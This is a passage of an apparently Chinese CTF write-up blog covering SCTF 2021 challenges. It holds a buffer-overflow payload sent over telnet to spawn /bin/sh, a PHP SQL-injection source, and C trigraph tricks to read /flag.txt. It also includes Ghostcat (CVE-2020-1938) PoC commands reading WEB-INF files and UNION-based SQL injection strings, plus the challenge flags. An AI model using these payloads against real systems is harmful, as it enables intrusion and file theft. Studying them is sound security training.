&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;Name &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xe0\x83\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;C&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x34\xa0\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">interact&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{B0F_A774ck_w1Th_arg5_1n_x86}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli-101">Tutorial/SQLi 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816201332616.png" alt="image-20210816201332616">&lt;/p>
&lt;p>&lt;code>SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli102">Tutorial/SQLi102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;./config.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;showsrc&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;step1.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select * from books where title like &amp;#39;%&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;%&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">dbconnect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sqli102_step3&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">mysqli_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{b451c_SQLi_5k1lls}&lt;/code>&lt;/p>
&lt;h2 id="tutorialrc-four">Tutorial/RC four&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/">https://www.geeksforgeeks.org/rc4-encryption-algorithm/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="tutorialrsa-101">Tutorial/RSA 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="websw-expert-academy">Web/SW Expert Academy&lt;/h2>
&lt;blockquote>
&lt;p>Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816213453433.png" alt="image-20210816213453433">&lt;/p>
&lt;p>å¥½å®¶ä¼™ï¼Œæ¢¦å›å­¦cè¯­è¨€çš„æ—¶å€™ï¼Œçœ‹åˆ°è¿™ä¸ªéª°å­çš„æ¦‚ç‡åˆèƒ½æ¢¦å›é«˜ä¸‰æ•°å­¦çš„æ¦‚ç‡éƒ¨åˆ†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816233522899.png" alt="image-20210816233522899">&lt;/p>
&lt;p>ä½†æ˜¯æï¼Œå®ƒå¹¶ä¸éœ€è¦ä½ å…·ä½“å†™å‡ºæ¥codeï¼Œæ ‡ç­”å·²ç»ç»™å‡ºï¼ˆè™½ç„¶æˆ‘æ†¨æ†¨çš„ä¸€å¼€å§‹æ²¡å‘ç°è‡ªå·±è¿˜å†™äº†ä¸€ä»½ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">];&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">scanf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">j&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">36&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">&amp;gt;=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#f92672">/=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%d/%d&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ans&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">mod&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“ç„¶ç›´æ¥è®¿é—®/flag.txtåˆæ˜¯ä¸å¯ä»¥çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210817001655162.png" alt="image-20210817001655162">&lt;/p>
&lt;p>é—®é¢˜å°±è½¬åŒ–ä¸ºäº†å¦‚ä½•åœ¨è¾“å‡ºä¸ºç¬¦åˆæ ·ä¾‹è¦æ±‚çš„æ ‡å‡†è¾“å‡ºçš„æƒ…å†µä¸‹è¿˜èƒ½æ‰“å°ä¸€ä»½åœ°å€å·²çŸ¥çš„flag.txtå‡ºæ¥&lt;/p>
&lt;p>ç”±äºgccæ—¢èƒ½ç¼–è¯‘cä¹Ÿå¯ä»¥ç¼–è¯‘c++ï¼Œè¿™é‡Œç”¨importæ¥ç»•è¿‡å¯¹includeçš„é™åˆ¶ï¼›è€Œå¯¹äº#çš„ç»•è¿‡å¯ä»¥å‚è§-&amp;gt;&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs and trigraphs&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;span style="color:#f92672">%:&lt;/span>&lt;span style="color:#111">import&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›¸å½“äº&lt;a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">#import &amp;ldquo;/flag.txt&amp;rdquo;&lt;/a>ï¼Œä»gccç¼–è¯‘æ—¶çš„æŠ¥é”™ä¿¡æ¯å¯ä»¥å¾—åˆ°flag&lt;/p>
&lt;p>æˆ–è€…ç”¨åæ–œæ +æ¢è¡Œçš„å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#f92672">??=&lt;/span>&lt;span style="color:#111">incl&lt;/span>\
&lt;span style="color:#111">ude&lt;/span> &lt;span style="color:#d88200">&amp;#34;/flag.txt&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥ç»•è¿‡å¯¹includeçš„è¿‡æ»¤&lt;/p>
&lt;p>&lt;code>SCTF{take-care-when-execute-unknown-code}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”ç±»ä¼¼çš„é¢˜ä¹‹å‰åšè¿‡ä¸€ä¸ª&lt;a href="https://imagin.vip/?p=1063#CaaS">[FireshellCTF2020]Caas&lt;/a>ï¼Œä¹Ÿæ˜¯é¢„å¤„ç†éå†æŠ¥é”™å‡ºflag&lt;/p>
&lt;p>â€”â€”â€”â€”åœ¨çœ‹äº†&lt;a href="https://zhuanlan.zhihu.com/p/401197671">åˆ«çš„å¸ˆå‚…çš„wp&lt;/a>ä¹‹åçœ‹åˆ°äº†å¦ä¸€ç§è§£æ³•ï¼Œä»æœªè®¾æƒ³è¿‡çš„é“è·¯&lt;/p>
&lt;h2 id="webpoxe-center">Web/Poxe Center&lt;/h2>
&lt;blockquote>
&lt;p>how to get legendary poxemon?&lt;/p>
&lt;/blockquote>
&lt;p>çœ‹äº†&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">wp&lt;/a>ï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904145411586.png" alt="image-20210904145411586">&lt;/p>
&lt;p>ä¸è¿‡å®˜æ–¹çš„é¢„æœŸè§£wpæ›´å¤æ‚ä¸€äº›ï¼š&lt;/p>
&lt;p>å…ˆçˆ†ç›®å½•/docs/&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904152658881.png" alt="image-20210904152658881">&lt;/p>
&lt;p>è¿™ä¸ªç‰ˆæœ¬ä¸‹æœ‰&lt;a href="https://www.chaitin.cn/zh/ghostcat">CVE-2020-1938 - Ghostcat&lt;/a>ï¼Œç›¸å…³æ–‡ç« å‚è€ƒ-&amp;gt;&lt;a href="https://paper.seebug.org/1147/">ä¸è°ƒè¯•æºç é‡ç° Ghostcat æ¼æ´ (CVE-2020-1938)&lt;/a>&lt;/p>
&lt;p>ä½¿ç”¨&lt;a href="https://github.com/hypn0s/AJPy">å…¬å¼€çš„poc&lt;/a>è¯»ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œä¹‹åå°†classåç¼–è¯‘è·å¾—javaæºæ–‡ä»¶ï¼ˆå®˜æ–¹pocç²¾ç®€äº†ä¸€äº›å†…å®¹ ä¸è¿‡å¤§å·®ä¸å·®ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>python poc.py -p 31811 -f &amp;quot;/WEB-INF/web.xml&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/MainController.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/classes/com/samsung/sctf/gochaMapper.class&amp;quot; 127.0.0.1
python poc.py -p 31811 -f &amp;quot;/WEB-INF/demo/WEB-INF/classes/mapper/gochaMapper.xml&amp;quot; 127.0.0.1
&lt;/code>&lt;/pre>&lt;p>/WEB-INF/classes/mapper/gochaMapper.xmlæ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904163606221.png" alt="image-20210904163606221">&lt;/p>
&lt;p>è¿™é‡Œçš„sortNameå’ŒsortFlagç›´æ¥æ‹¼æ¥è¿›sqlè¯­å¥ä¸­æ²¡æœ‰è¿‡æ»¤ï¼Œå°è¯•sqli&lt;/p>
&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20true)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select true) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=(case%20when%20(select%20false)%20then%20BID%20else%20%270%27%20end)&amp;amp;sortFlag=desc
sortName=(case when (select false) then poke_name else '0' end)&amp;amp;sortFlag=asc
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT'A','B','C','D','D','F',now(),'G','H','I' FROM(SELECT 1
sortFlag=NULL
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>sortName=random())dummy UNION SELECT DD.&amp;quot;index&amp;quot;,DD.&amp;quot;name&amp;quot;,DD.first_attribute,DD.second_attribute,'XX','XX',now(),'XX','XX','XX' FROM( SELECT * from poke_info
sortFlag=&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;code>{G0tcH4_Gh0sT_c4t_iS_L3G3ND4Ry_P0k3}&lt;/code>&lt;/p>
&lt;h2 id="miscmelorean">Misc/meLorean&lt;/h2>
&lt;blockquote>
&lt;p>There was a crazy Data Scientist who rectilinearly claimed mathematics can make miracles.
He left a note and then disappeared. Help to decode it.&lt;/p>
&lt;/blockquote>
&lt;p>ç»™å‡ºäº†ä¸€ä¸ªè¿™æ ·çš„æ–‡ä»¶ï¼Œå……æ»¡äº†äºŒç»´åæ ‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210904143738246.png" alt="image-20210904143738246">&lt;/p>
&lt;p>ä¸€ä¸ªçº¿æ€§å›å½’çš„ç›¸å…³é—®é¢˜ï¼Œéœ€è¦ç”¨åˆ°pythonä¸­çš„sklearn.linear_modelè¿›è¡Œæ•°æ®å¤„ç†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ast&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sklearn.linear_model&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataset.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ast&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">literal_eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">X&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">X&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">round&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">coef_&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Pr0gre55_In_R3gr3ss}&lt;/code>&lt;/p>
&lt;h2 id="adbaby">ADBaby&lt;/h2>
